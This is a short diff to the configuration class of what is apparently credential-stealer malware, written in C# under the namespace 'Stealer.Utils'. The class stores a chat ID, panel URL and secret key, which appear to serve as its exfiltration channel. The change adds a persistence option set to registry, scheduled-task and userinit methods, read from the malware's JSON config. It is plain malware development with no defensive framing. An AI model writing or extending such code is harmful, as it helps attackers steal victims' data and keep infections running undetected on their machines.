@@ -12,6 +12,7 @@ namespace Stealer.Utils
         public static string ChatId { get; private set; } = "";
         public static string PanelUrl { get; private set; } = "";
         public static string SecretKey { get; private set; } = "";
+        public static string Persistence { get; private set; } = "registry,scheduler,userinit";
         
         private static bool _initialized = false;
 
@@ -49,6 +50,7 @@ namespace Stealer.Utils
                         ChatId = ParseJsonKey(json, "chatId").Trim().TrimEnd('\0', ' ');
                         PanelUrl = ParseJsonKey(json, "panelUrl").Trim().TrimEnd('\0', ' ');
                         SecretKey = ParseJsonKey(json, "secretKey").Trim().TrimEnd('\0', ' ');
+                        Persistence = ParseJsonKey(json, "persistence").Trim().TrimEnd('\0', ' ');
                     }
                 }
             }
